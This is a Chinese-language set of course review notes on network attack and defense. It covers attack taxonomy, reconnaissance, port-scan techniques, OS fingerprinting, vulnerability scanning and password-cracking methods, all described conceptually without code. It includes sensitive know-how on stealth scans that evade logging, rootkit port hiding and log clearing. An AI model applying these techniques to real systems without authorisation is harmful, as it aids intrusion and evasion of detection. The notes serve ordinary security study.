    <content><![CDATA[<h1 id="网络攻防技术"><a href="#网络攻防技术" class="headerlink" title="网络攻防技术*"></a>网络攻防技术*</h1><h2 id="攻击分类的标准-amp-类别"><a href="#攻击分类的标准-amp-类别" class="headerlink" title="攻击分类的标准&amp;类别*"></a>攻击分类的标准&amp;类别*</h2><h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><p>日常对网络攻击的分类并不严谨，学术上攻击分类从入侵检测需求出发，要求遵循以下标准：</p>
<ul>
<li><p><strong>互斥性</strong>（分类类别不应重叠）</p>
</li>
<li><p><strong>完备性</strong>（覆盖所有可能的攻击）</p>
</li>
<li><p><strong>非二义性</strong>（类别划分清晰）</p>
</li>
<li><p><strong>可重复性</strong>（对一个样本多次分类结果一致）</p>
</li>
<li><p><strong>可接受性</strong>（符合逻辑和直觉）</p>
</li>
<li><p><strong>实用性</strong>（可用于深入研究和调查）</p>
</li>
</ul>
<br>

<h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p>按照攻击发生时，攻守双方之间的交互关系进行分类：</p>
<ul>
<li><strong>本地攻击&#x2F;物理攻击</strong></li>
</ul>
<p>攻击者通过<strong>实际接触</strong>被攻击的主机而实施的攻击。（如：U盘、拔网线）</p>
<ul>
<li><strong>主动攻击（服务器端）</strong></li>
</ul>
<p>攻击者对被攻击主机所运行的 Web、FTP（文件传输协议）、Telnet等<strong>开放网络服务</strong>实施攻击。</p>
<blockquote>
<p>攻击者——&gt;服务器</p>
</blockquote>
<ul>
<li><strong>被动攻击（客户端）</strong></li>
</ul>
<p>攻击者利用浏览器、邮件接收程序、文字处理程序等<strong>客户端应用程序漏洞或系统用户弱点</strong>，对目标实施各种攻击。（局限于受害者自己的弱点，如：钓鱼网站&#x2F;邮件、XSS等）</p>
<blockquote>
<p>用户&lt;——恶意服务器</p>
</blockquote>
<ul>
<li><strong>中间人攻击</strong></li>
</ul>
<p>指攻击者处于被攻击主机的某个网络应用的<strong>中间人位置</strong>，进行数据窃听、破坏和篡改等攻击。</p>
<blockquote>
<p>​         攻击者<br>​                     |<br>客户程序 &lt;—— 服务器</p>
</blockquote>
<br>

<br>

<h2 id="攻击步骤与方法"><a href="#攻击步骤与方法" class="headerlink" title="攻击步骤与方法*"></a>攻击步骤与方法*</h2><p><em><strong>每个步骤的详细理解</strong></em></p>
<br>

<p>一个完整的、有预谋的攻击通常可以分为5个步骤：</p>
<ol>
<li>信息收集（Information Gathering）</li>
<li>权限获取（Exploit）</li>
<li>安装后门（Control）</li>
<li>扩大影响（Lan Penetration）</li>
<li>消除痕迹（Clearing）</li>
</ol>
<img src="网络攻防技术复习.assets/image-20231229150941499.png" alt="image-20231229150941499" style="zoom: 67%;" />

<br>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h3><p>任务和目的：尽可能多的收集目标的相关信息，为后续的精确攻击建立基础。</p>
<p>主要方法：</p>
<ul>
<li>主动攻击<ul>
<li>利用公开信息服务</li>
<li>主机扫描与端口扫描</li>
<li>操作系统探测与应用程序类型识别</li>
</ul>
</li>
</ul>
<br>

<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a><strong>获取权限</strong></h3><p>任务和目的：获取目标系统的读、写、执行等权限。</p>
<p>主要方法：</p>
<ul>
<li>主动攻击：<ul>
<li>口令攻击</li>
<li>缓冲区溢出</li>
<li>脚本攻击</li>
</ul>
</li>
<li>被动攻击：<ul>
<li>特洛伊木马</li>
<li>使用邮件、IM等发送恶意链接</li>
</ul>
</li>
</ul>
<br>

<h3 id="安装后门"><a href="#安装后门" class="headerlink" title="安装后门"></a><strong>安装后门</strong></h3><p>任务和目的：在目标系统中安装后门程序，以更加方便、更加隐蔽的方式对目标系统进行操控。</p>
<p>主要方法：</p>
<ul>
<li>主机控制木马</li>
<li>Web服务控制木马</li>
</ul>
<br>

<h3 id="扩大影响"><a href="#扩大影响" class="headerlink" title="扩大影响"></a><strong>扩大影响</strong></h3><p>任务和目的：以目标系统为« 跳板 »，对目标所属网络的其他主机进行攻击，最大程度地扩大攻击的效果。</p>
<p>主要方法：</p>
<ul>
<li>可使用远程攻击主机的所有攻击方式</li>
<li>可使用局域网内部攻击所特有的嗅探、假消息攻击等方式</li>
</ul>
<br>

<h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a><strong>清除痕迹</strong></h3><p>任务和目的：清除攻击的痕迹，以尽可能长久地对目标进行控制，并防止被识别、追踪。</p>
<p>主要方法：</p>
<ul>
<li><p>Rootkit 隐藏</p>
<blockquote>
<p>Rookit 是一种恶意软件，使用RootKit 的步骤如下：</p>
<ol>
<li>hook 掉某一个系统函数，用自己的函数代替</li>
<li>自己的函数调用原函数，然后对于原函数的结果进行处理</li>
<li>返回处理结果</li>
</ol>
<p>如隐藏端口信息，无论是 cat 命令，还是 netstat 命令查看端口，都是读取 <code>/proc/net/tcp</code> 文件，于是我们 hook 该文件的钩子函数就可以实现隐藏端口的目的了。</p>
</blockquote>
</li>
<li><p>系统安全日志清除</p>
</li>
<li><p>应用程序日志清除</p>
</li>
</ul>
<br>

<br>

<h2 id="物理攻击-amp-社会工程学"><a href="#物理攻击-amp-社会工程学" class="headerlink" title="物理攻击&amp;社会工程学"></a>物理攻击&amp;社会工程学</h2><h3 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a><strong>物理攻击</strong></h3><p>通过各种技术手段绕开物理安全防护体系，从而进入受保护的设施场所或设备资源内，获取或破坏信息系统物理媒体中受保护信息的攻击方式。</p>
<p>防范手段：门禁安全</p>
<br>

<h3 id="社会工程学攻击"><a href="#社会工程学攻击" class="headerlink" title="社会工程学攻击"></a><strong>社会工程学攻击</strong></h3><p>利用人类的愚蠢，操纵他人执行预期的动作或泄露机密信息的一门艺术与学问。</p>
<p>技巧：</p>
<ul>
<li>不引人关注的职业，攻击新员工，伪装身份，正面攻击，构造陷阱施以援手，制造陷阱骗取同情与帮助</li>
<li>施以小恩小惠，垃圾搜寻，结合多种技术手段</li>
</ul>
<p>防护手段：不用真名上网、不轻信别人、不让他人轻易接触设备、安全规范、涉密信息保护警觉</p>
<br>

<br>

<br>

<h1 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术*"></a>信息收集技术*</h1><h2 id="公开信息收集"><a href="#公开信息收集" class="headerlink" title="公开信息收集"></a>公开信息收集</h2><p><em><strong>定义、内容、分类及必要性</strong></em></p>
<br>

<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>信息收集是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动。</p>
<br>

<h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>利用Web服务</p>
<ul>
<li>网站拥有者信息<ul>
<li>邮编、地址</li>
<li>论坛版本号</li>
<li>网络管理员邮箱</li>
<li>公司人员名单、电话、邮箱</li>
<li>……</li>
</ul>
</li>
<li>得到对应的 IP 地址<ul>
<li>利用 DNS 服务器：提供域名到 IP 地址的映射</li>
</ul>
</li>
<li>获取目标网络拓扑结构<ul>
<li>网络拓扑图</li>
<li>IP 分配表</li>
<li>子域名</li>
<li>网络设备、安全设施</li>
<li>……</li>
</ul>
</li>
</ul>
<br>

<p>利用搜索引擎服务</p>
<ul>
<li><p>共同特点：利用公开信息服务收集信息</p>
<ul>
<li>信息是公开的</li>
<li>海里的信息中很多都是敏感信息</li>
</ul>
</li>
<li><p>搜索引擎为我们提供了在 WEB 检索信息的功能。它在互联网收集网站摘要信息的同时，也收集了许多隐蔽信息。</p>
</li>
<li><p>Google Hacking 就是利用搜索引擎强大的搜索功能，选用<strong>搜索语法</strong>和特殊的<strong>搜索关键字</strong>，将隐藏在目标网站中的不恰当配置信息和后门信息找出来。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">基本语法</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="center">AND</td>
<td>与</td>
</tr>
<tr>
<td align="center">OR</td>
<td>或</td>
</tr>
<tr>
<td align="center">+</td>
<td>强制包含搜索项</td>
</tr>
<tr>
<td align="center">-</td>
<td>非，去掉搜索项</td>
</tr>
<tr>
<td align="center">“”</td>
<td>包含一个完整的语义</td>
</tr>
<tr>
<td align="center">.</td>
<td>单个通配符</td>
</tr>
<tr>
<td align="center">*</td>
<td>任意通配符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">高级操作符</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="center">site:</td>
<td>搜索具体服务器或域名的网页</td>
</tr>
<tr>
<td align="center">filetype:</td>
<td>搜索特定类型的文件</td>
</tr>
<tr>
<td align="center">intitle:</td>
<td>搜索网页标题</td>
</tr>
<tr>
<td align="center">inurl:</td>
<td>搜索URL</td>
</tr>
<tr>
<td align="center">intext:</td>
<td>搜索正文</td>
</tr>
<tr>
<td align="center">link:</td>
<td>搜索连接到指定网页的网页</td>
</tr>
</tbody></table>
<ul>
<li>Google Hacking 可以做到<ul>
<li>搜索密码文件</li>
<li>搜索管理员后台URL</li>
<li>搜索Web应用漏洞</li>
<li>搜索黑客留下的后门</li>
<li>……</li>
</ul>
</li>
</ul>
<br>

<p>利用 Whols 服务</p>
<ul>
<li>功能：查询已注册域名的拥有者信息<ul>
<li>域名登记人信息</li>
<li>联系电话和邮箱</li>
<li>域名注册时间和更新时间</li>
<li>权威 DNS 的 IP 地址</li>
</ul>
</li>
<li>使用方法：<ul>
<li><a href="http://www.whois.net/">www.whois.net</a></li>
<li>SamSpade 等网络实用工具</li>
<li>利用网站获得 Whois 数据</li>
<li>企业的备案信息</li>
</ul>
</li>
</ul>
<br>

<p>利用DNS域名服务</p>
<ul>
<li>DNS：提供域名到 IP 地址的映射<ul>
<li>权威 DNS——主 DNS</li>
<li>Cache-Only DNS——副 DNS</li>
</ul>
</li>
<li>区域传送（Zone transfer）：允许一个辅域名服务器更新自己的区域数据</li>
<li>如果 DNS 配置不当，可能造成内部主机名和 IP 地址对的泄露</li>
</ul>
<br>

<p>公开信息收集方法的应用</p>
<ul>
<li>社会工程学</li>
<li>Maltego：开源情报收集和取证的工具</li>
</ul>
<br>

<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>主动：通过直接访问、扫描网站</p>
<ul>
<li>将流量主动流经网站</li>
<li>获得信息较多，目标主机会记录操作记录。</li>
</ul>
<p>被动：利用第三方的服务对目标进行访问了解</p>
<ul>
<li>比如：Google搜索、whois、DNS（nslookup）服务等</li>
<li>获得信息较少，目标主机不会记录操作记录。</li>
</ul>
<br>

<h3 id="必要性"><a href="#必要性" class="headerlink" title="必要性"></a>必要性</h3><p>知己知彼百战不殆，对敌方信息的掌握是关键</p>
<ul>
<li><p>攻击者——先手优势</p>
<ul>
<li>攻击目标信息收集</li>
</ul>
</li>
<li><p>防御者——后发制人</p>
<ul>
<li>对攻击者实施信息收集，追踪溯源，不是只有攻击者才需要信息搜集</li>
</ul>
</li>
</ul>
<blockquote>
<p>目前很多服务器采用 CDN技术，DNS服务器 解析时交给 CDN 专用DNS服务器，不同的 请求IP 分配不同的 CDN缓存服务器，这种技术实现了以空间换时延和带宽，但是也隐藏了服务<br>器的 真实IP，这时可以使用一些探测工具判定是否使用了 CDN，一般 响应IP 非常多就大概率是 CDN，如果只有几个则可能是负载均衡。</p>
</blockquote>
<br>

<br>

<h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描*"></a>网络扫描*</h2><p><em><strong>类型（主机 \ 端口 \ 系统类型扫描）、原理</strong></em></p>
<br>

<p>扫描方法可分为两类：</p>
<ul>
<li>主动扫描：向目标发送探测数据包，通过<strong>获得的回应</strong>来获得目标的信息。</li>
<li>被动扫描：不主动向外发送数据包，只是通过<strong>捕获网络内传输的数据包</strong>来获得目标的信息。</li>
</ul>
<br>

<p>主动扫描：</p>
<ul>
<li>主机扫描：查看目标网络中有哪些主机是存活的。</li>
<li>端口扫描：查看存活的主机运行了哪些服务，比如 WWW，FTP，Telnet 等。</li>
<li>系统类型扫描：查看目标主机运行的操作系统类型以及版本。</li>
</ul>
<br>

<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>Ping：Ping 使用 ICMP（因特网控制报文协议）协议进行工作。</p>
<p>ICMP 是 IP 层的一个部分，主要有两大功能：网络信息查询、IP 传送时的差错报告与控制（比如目标不可达、路由重定向）</p>
<p>报文格式：</p>
<ul>
<li>类型域（type）：用来指明该 ICMP 报文的类型</li>
<li>代码域（code）：确定该包具体作用</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231219212017306.png" alt="image-20231219212017306" style="zoom:67%;" />

<br>

<p>常见的ICMP报文类型</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ICMP Destination Unreachable（ICMP 目标不可达）</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">ICMP Source Quench（ICMP 源抑制）</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">ICMP Redirection（ICMP 重定向）</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">ICMP Timestamp Request&#x2F;Reply（ICMP 时间戳请求&#x2F;应答）</td>
<td align="center">13&#x2F;14</td>
</tr>
<tr>
<td align="center">ICMP Address Mask Request&#x2F;Reply（ICMP 子网掩码请求&#x2F;应答）</td>
<td align="center">17&#x2F;18</td>
</tr>
<tr>
<td align="center">ICMP Echo Request&#x2F;Reply（ICMP 响应请求&#x2F;应答）</td>
<td align="center">8&#x2F;0</td>
</tr>
</tbody></table>
<br>

<p>Ping的实现机制：</p>
<ul>
<li>向目标主机发送 <strong>ICMP Echo Request（type 8）</strong>数据包，等待回复的 <strong>ICMP Echo Reply（type 0）</strong>数据包</li>
<li>数据区包含了一些随机测试数据，如 « A B C D E F G… » 等</li>
</ul>
<blockquote>
<p>注意：根据 RFC 的定义，TCP&#x2F;IP协议栈 应该支持各种类型的 ICMP报文。但事实上，在各个操作系统具体实现 TCP&#x2F;IP 时，可能并没有完全遵循 RFC标准。即某些操作系统不一定会对 ICMP子网掩码请求 或是 ICMP时间戳请求 做出应答。</p>
</blockquote>
<br>

<p>高级IP扫描技术</p>
<ul>
<li><strong>构造异常的IP包头</strong>：向目标主机发送包头错误的IP包，目标主机或过滤设备如果存活则会反馈 ICMP Parameter Problem Error 信息。常见的伪造错误字段为 Header Length Field 和 IP Options Field。</li>
<li><strong>在IP头中设置无效的字段值</strong>：向目标主机发送的IP包中填充错误的字段值，目标主机或过滤设备如果存则会反馈 ICMP Destination Unreachable 信息。</li>
<li><strong>构造错误的数据分片</strong>：当目标主机接收到错误的数据分片（如某些分片丢失)，并且在规定的时间间隔内得不到更正时，将会丢弃这些数据包，并且向主机发送 ICMP Fragment Reassembly Time Exceeded 报文。</li>
</ul>
<br>

<br>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>端口是通信的通道——入侵通道</p>
<p>端口分为 TCP 端口和 UDP 端口</p>
<p>端口扫描可以分为：TCP 扫描、UDP 扫描</p>
<br>

<h4 id="基本扫描"><a href="#基本扫描" class="headerlink" title="基本扫描"></a>基本扫描</h4><p>即 <strong>TCP全连接扫描</strong>，直接连接到目标端口并且完成一个完整的3次握手过程。</p>
<p>目的端口情况判断：</p>
<ul>
<li>端口关闭：返回 RST</li>
<li>端口开放：返回 SYN+ACK</li>
<li>有防火墙（目的端口被过滤）：返回 ICMP 端口不可达消息（type 3）</li>
</ul>
<br>

<h4 id="隐秘扫描"><a href="#隐秘扫描" class="headerlink" title="隐秘扫描"></a>隐秘扫描</h4><p><em><strong>SYN扫描和Fin扫描</strong></em></p>
<p>扫描必须向目标发送某种数据包，而对于这种数据包，开放端口和关闭端口的响应是有差异的。</p>
<p>这种数据包的发送和接收过程往往不同于正常的TCP数据的发送和接收过程。</p>
<br>

<p><strong>SYN 扫描（也被称为半打开扫描）</strong></p>
<p>只向服务器发送建立连接请求的 SYN 数据包，等待回应。</p>
<blockquote>
<p>不需要发送最后一个 ACK 数据包（不在服务器上留下TCP连接建立记录）</p>
<p>因为我们检测一个端口是否打开，并不需要完全地建立一个连接。</p>
<p>只要服务器回送了 SYN+ACK 包就说明该端口是打开的。</p>
</blockquote>
<p>判断端口是否打开：</p>
<ul>
<li>端口开放：返回 SYN+ACK</li>
<li>端口关闭：返回 RST</li>
</ul>
<p>优点：一般不会被目标主机的应用所记录</p>
<p>缺点：运行 Raw Socket 时必须拥有管理员权限</p>
<br>

<p><strong>FIN 扫描</strong></p>
<p>对于 FIN 报文的回复：</p>
<ul>
<li>TCP 标准<ul>
<li>关闭的端口：返回RST报文</li>
<li>打开的端口：忽略</li>
</ul>
</li>
<li>Unix BSD 操作系统<ul>
<li>与TCP标准一致</li>
</ul>
</li>
<li>其他操作系统<ul>
<li>均返回RST报文</li>
</ul>
</li>
</ul>
<p>优点：</p>
<ol>
<li>不会被记录到日志</li>
<li>可以绕过某些防火墙</li>
<li>Netstate 命令不会显示主机收到了扫描（因为该命令只能显示TCP连接或连接的尝试）</li>
</ol>
<p>缺点：</p>
<ol>
<li>使用 RAW IP 编程，实现起来相对复杂</li>
<li>不同操作系统结果不同，因此不完全可信</li>
<li>要判断对方端口是否开放必须等待超时，增加了探测时间，而且容易得出错误的结论</li>
</ol>
<br>

<h4 id="其他端口扫描技术"><a href="#其他端口扫描技术" class="headerlink" title="其他端口扫描技术"></a>其他端口扫描技术</h4><p><strong>TCP Xmas Tree扫描</strong></p>
<p>向目标端口发送含有 PSH+FIN+URG 标志的分组。</p>
<ul>
<li><p>端口开放：没有回应</p>
</li>
<li><p>端口关闭：服务器返回RST</p>
</li>
<li><p>有防火墙：返回 ICMP</p>
</li>
</ul>
<br>

<p><strong>NULL扫描</strong></p>
<p>向目标端口发送没有标识信息的数据包，结果和Xmas Tree一样</p>
<br>

<p><strong>ACK扫描</strong></p>
<p>向目标端口发送 ACK</p>
<ul>
<li><p>不存在状态防火墙：返回RST</p>
</li>
<li><p>存在状态防火墙：没有回应或者返回 ICMP</p>
</li>
</ul>
<br>

<p><strong>Window扫描</strong></p>
<p>客户端发送ACK，收到RST后检查窗口大小的值</p>
<ul>
<li><p>端口开放：window !&#x3D; 0</p>
</li>
<li><p>端口关闭：window&#x3D;0</p>
</li>
</ul>
<br>

<p><strong>IP分段扫描</strong></p>
<p>不直接发送TCP协议探测数据包，而是将数据包分成两个较小的IP协议段。</p>
<p>这样就将一个TCP协议头分成好几个数据包，从而过滤器就很难探测到。</p>
<br>

<p><strong>TCP FTP Proxy扫描</strong></p>
<p>对于大部分实际的 FTP服务器 而言，FTP代理连接使得 FTP客户端 能够控制 FTP服务器 向网络上的任何一台主机发送文件。</p>
<p>FTP代理扫描 利用 FTP代理连接选项 来进行，通过 FTP服务器 扫描目标主机的 TCP端口。</p>
<p>判断：</p>
<ul>
<li><p>处于监听状态，数据传输成功；</p>
</li>
<li><p>否则，会收到数据连接无法建立的应答。</p>
</li>
</ul>
<p>使用PORT命令指定目标主机的端口号；LIST命令对对应端口号进行数据传输。</p>
<p>缺点：用于扫描的 FTP服务器 必须支持 FTP代理连接选项</p>
<br>

<p>UDP端口扫描技术</p>
<p>发送UDP，开放则返回UDP，返回 ICMP 则目标端口关闭（目标不可达）或被过滤（错误类型3），没有回答代表开放或被过滤</p>
<br>

<h4 id="端口扫描常用工具"><a href="#端口扫描常用工具" class="headerlink" title="端口扫描常用工具"></a>端口扫描常用工具</h4><p>UNIX 下的端口扫描工具：Nmap</p>
<p>Windows下的端口扫描工具：SuperScan、Nmap for windows</p>
<br>

<h3 id="系统类型扫描"><a href="#系统类型扫描" class="headerlink" title="系统类型扫描"></a>系统类型扫描</h3><h4 id="利用端口扫描的结果"><a href="#利用端口扫描的结果" class="headerlink" title="利用端口扫描的结果"></a>利用端口扫描的结果</h4><p>操作系统往往提供一些自身特有的功能，而这些功能又很有可能打开一些特定的端口。</p>
<ul>
<li>windows： 137、139、445等端口</li>
<li>Linux： 512~514、2049等端口</li>
</ul>
<br>

<h4 id="利用Banner"><a href="#利用Banner" class="headerlink" title="利用Banner"></a>利用Banner</h4><p>所谓 Banner（旗标）指的是服务程序接收到客户端的正常连接后所给出的欢迎信息。</p>
<p>e.g： 220 *** Microsoft FTP service (version 5.0)</p>
<br>

<h4 id="利用-TCP-x2F-IP-协议栈指纹"><a href="#利用-TCP-x2F-IP-协议栈指纹" class="headerlink" title="利用 TCP&#x2F;IP 协议栈指纹"></a>利用 TCP&#x2F;IP 协议栈指纹</h4><p><em>最准确的方式</em></p>
<p>不同的操作系统在实现 TCP&#x2F;IP 协议栈时都或多或少地存在着差异。而这些差异，我们就称之为 TCP&#x2F;IP 协议栈指纹。</p>
<ul>
<li><p>不同的操作系统在实现 TCP&#x2F;IP 协议栈的时候，并不是完全按照 RFC 所定义的标准来实现的。</p>
</li>
<li><p>在 RFC 中也没有对所有的问题给予准确的定义。</p>
</li>
</ul>
<p>TCP指纹：</p>
<img src="网络攻防技术复习.assets\image-20231220181657458.png" alt="image-20231220181657458" style="zoom: 50%;" />

<br>

<p>ICMP指纹：</p>
<img src="网络攻防技术复习.assets/image-20231220181715079.png" alt="image-20231220181715079" style="zoom: 50%;" />

<p>协议栈指纹探测工具：Checkos、Queso、Nmap</p>
<br>

<br>

<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p><em>目的、原理、组件及方法</em></p>
<br>

<p>漏洞又称<strong>脆弱性</strong>，是指计算机系统在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷或不足。</p>
<blockquote>
<p>漏洞的来源：</p>
<ul>
<li>硬件、软件或协议涉设计时的瑕疵</li>
<li>硬件、软件或协议实现中的弱点</li>
<li>硬件、软件本身的瑕疵</li>
<li>系统和网络的错误配置</li>
</ul>
</blockquote>
<br>

<p>漏洞扫描：指利用一些专门或综合漏洞扫描程序对目标存在的系统漏洞或应用程序漏洞进行扫描。</p>
<blockquote>
<p>缺陷：报告不一定可靠、易暴露目标</p>
</blockquote>
<br>

<p>漏洞检测就是对重要计算机信息系统进行检查，发现其中可被黑客利用的漏洞。</p>
<p>该技术通常采用两种策略，即被动式策略和主动式策略：</p>
<ul>
<li>被动式策略<ul>
<li>基于主机的检测，对系统中不合适的设置、脆弱的口令以及其他安全规则相抵触的对象进行检查。</li>
</ul>
</li>
<li>主动式策略<ul>
<li>基于网络的检测，通过执行一些脚本文件对系统进行攻击，并记录他的反应，从而发现其中的漏洞。</li>
</ul>
</li>
</ul>
<br>

<p>该技术的主要方法：直接测试、推断、带凭证的测试</p>
<ul>
<li><p>直接测试：利用漏洞特点发现系统漏洞的方法。</p>
<ul>
<li>通常用于对 Web 服务器漏洞、拒绝服务（Dos）漏洞进行检测。</li>
<li>能够准确地判断系统是否存在特定漏洞。</li>
<li>对于渗透所需步骤较多的漏洞速度较慢。</li>
<li>攻击性较强，可能对存在漏洞的系统造成破坏。</li>
<li>对于Dos漏洞，测试方法会造成系统崩溃。</li>
<li>不是所有漏洞的信息都能通过直接测试方法获得。</li>
</ul>
</li>
<li><p>推断：不利用系统漏洞而判断漏洞是否存在的方法。并不直接渗透漏洞，只是间接地寻找漏洞存在的证据。</p>
<ul>
<li>主要方法：版本检查、程序行为分析、操作系统堆栈指纹分析、时序分析<ul>
<li>版本检查是最简单的</li>
<li>行为分析在需要推翻某个 « 风险假设 » 十分有用</li>
</ul>
</li>
</ul>
</li>
<li><p>凭证：访问服务所需要的用户名或者密码，包括 UNIX 的登录权限和从网络调用 Windows NT 的 API 的能力。</p>
</li>
</ul>
<blockquote>
<p>漏洞扫描软件：ISS、SATAN &#x2F; SAINT、Nessus*</p>
</blockquote>
<br>

<br>

<h2 id="网络拓扑探测"><a href="#网络拓扑探测" class="headerlink" title="网络拓扑探测"></a>网络拓扑探测</h2><p><em>（拓扑探测 \ 网络设备识别 \ 网络实体IP地理位置定位）</em></p>
<h3 id="拓扑探测"><a href="#拓扑探测" class="headerlink" title="拓扑探测"></a>拓扑探测</h3><p>Traceroute：用来发现实际的路由</p>
<p>SNMP：不同类型网络设备之间<strong>客户机&#x2F;服务器</strong>模式的简单通信协议。</p>
<ul>
<li>两个基本命令模式：<ul>
<li>Read：观察设备配置信息。</li>
<li>Read &#x2F; Write：有权写入信息。</li>
</ul>
</li>
</ul>
<br>

<h3 id="网络设备（路由器-x2F-交换机）识别"><a href="#网络设备（路由器-x2F-交换机）识别" class="headerlink" title="网络设备（路由器 &#x2F; 交换机）识别"></a>网络设备（路由器 &#x2F; 交换机）识别</h3><p>搜索引擎：Sodan、ZoomEye</p>
<p>基于设备指纹的设备类型探测：Banner 信息</p>
<blockquote>
<p>Banner获取渠道：</p>
<ul>
<li>FTP 协议</li>
<li>SSH</li>
<li>Telnet</li>
<li>HTTP</li>
</ul>
</blockquote>
<br>

<h3 id="网络实体IP地理位置定位"><a href="#网络实体IP地理位置定位" class="headerlink" title="网络实体IP地理位置定位"></a>网络实体IP地理位置定位</h3><p>基于查询信息的定位：通过查询机构注册的信息确定网络设备的地理位置</p>
<p>基于网络测量的定位：利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置</p>
<br>

<br>

<br>

<h1 id="口令攻击"><a href="#口令攻击" class="headerlink" title="口令攻击"></a>口令攻击</h1><h2 id="口令的定义及作用"><a href="#口令的定义及作用" class="headerlink" title="口令的定义及作用"></a>口令的定义及作用</h2><p><em>操作系统口令</em></p>
<br>

<p>定义：口令通常指的是一种用于验证身份或获取特定权限的密码或短语。</p>
<blockquote>
<p>操作系统口令：操作系统口令通常指的是登录操作系统时所需的密码。</p>
</blockquote>
<p>作用：向系统提供唯一标识个体身份的机制，只给个体所需信息的访问权，从而达到保护敏感信息和个人隐私的目的。</p>
<br>

<h2 id="针对口令强度的攻击方法"><a href="#针对口令强度的攻击方法" class="headerlink" title="针对口令强度的攻击方法"></a>针对口令强度的攻击方法</h2><p>没有绝对安全的口令，只是攻击者的时间代价不同。</p>
<blockquote>
<p>弱口令：简单、有规律、容易记忆的口令。</p>
<ul>
<li>与用户名相同的口令</li>
<li>常用的单词和数字</li>
<li>与键盘位置相关的口令</li>
<li>以年月日作为口令</li>
</ul>
<p>强口令：不容易被发现规律，并且有足够的长度。</p>
</blockquote>
<br>

<p>攻击方法：</p>
<ul>
<li>强力攻击：速度足够快的计算机能尝试字母、数字、特殊字符的所有组合，将最终破解所有的口令。</li>
<li>字典攻击：将使用率较高的口令集中放在字典文件中，通过不同的编译规则生成猜测字典。</li>
<li>组合攻击：在字典单词尾部串接任意个字母和数字。</li>
<li>撞库攻击：攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令。</li>
<li>彩虹表攻击：彩虹表就是一种破解哈希算法的技术，主要可以破解 MD5、HASH 等多种密码。</li>
</ul>
<blockquote>
<p>应对彩虹表攻击：加盐（salt）：即使黑客知道了« 盐 »的内容、加盐的位置，还需要对H函数和R函数进行修改。</p>
</blockquote>
<br>

<br>

<h2 id="针对口令存储的攻击方法"><a href="#针对口令存储的攻击方法" class="headerlink" title="针对口令存储的攻击方法"></a>针对口令存储的攻击方法</h2><p>通常，系统为了验证的需要，都会将口令以明文或者密文的形式存放在系统中。</p>
<br>

<h3 id="针对缓存口令的攻击"><a href="#针对缓存口令的攻击" class="headerlink" title="针对缓存口令的攻击"></a>针对缓存口令的攻击</h3><p>在一个系统中，无论口令存放在什么位置，在进行用户的身份验证时，总要加载到内存中，这就存在口令泄露的风险。</p>
<p>除了系统本身，很多应用程序在处理用户口令时，也可能存在泄露。</p>
<blockquote>
<p>通过网页访问邮箱时，自动显示以前输入的用户名和口令。虽然是*号，但是在内存中是真正的口令。</p>
</blockquote>
<br>

<h3 id="针对口令文件的攻击"><a href="#针对口令文件的攻击" class="headerlink" title="针对口令文件的攻击"></a>针对口令文件的攻击</h3><p>文件是口令存储的一种常见方式：</p>
<ul>
<li>Windows 系统的账号和口令存储在 SAM 文件中</li>
<li>Linux 系统的账号和口令存储在 Shadow 文件中</li>
</ul>
<br>

<p>Windows Sam 文件：</p>
<ul>
<li>锁定：在操作系统运行期间，Sam 文件被 system 账号锁定，admin 权限也无法访问它。</li>
<li>隐藏：Sam 在注册表中的备份是被隐藏的。</li>
<li>不可读：系统保存 Sam 文件时将其信息进行过压缩处理，不具有可读性。</li>
</ul>
<br>

<p>Windows 使用 NTLM 算法作为加密机制：</p>
<ol>
<li>将口令转换为 Unicode 字符串</li>
<li>用 MD4 对口令进行单向 HASH，生成16字节的 HASH 值，NTLMv2 在此基础上增加了双向验证的功能</li>
</ol>
<br>

<p>Linux Shadow文件：</p>
<ul>
<li>密码字段有3个部分：使用的算法、salt、密码哈希</li>
<li>Salt 和密码散列编码为可打印字符</li>
<li>多轮哈希函数（减缓暴力攻击）</li>
</ul>
<p><img src="/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%A4%8D%E4%B9%A0.assets/image-20231221155932752.png" alt="image-20231221155932752"></p>
<p>Salt 的用途：</p>
<ul>
<li>相同的输入可能导致不同的散列</li>
<li>密码散列 &#x3D; 单向散列循环（密码 || 随机字符串)</li>
<li>随机字符串就是 salt</li>
<li>可以防止字典和彩虹表攻击</li>
</ul>
<br>

<br>

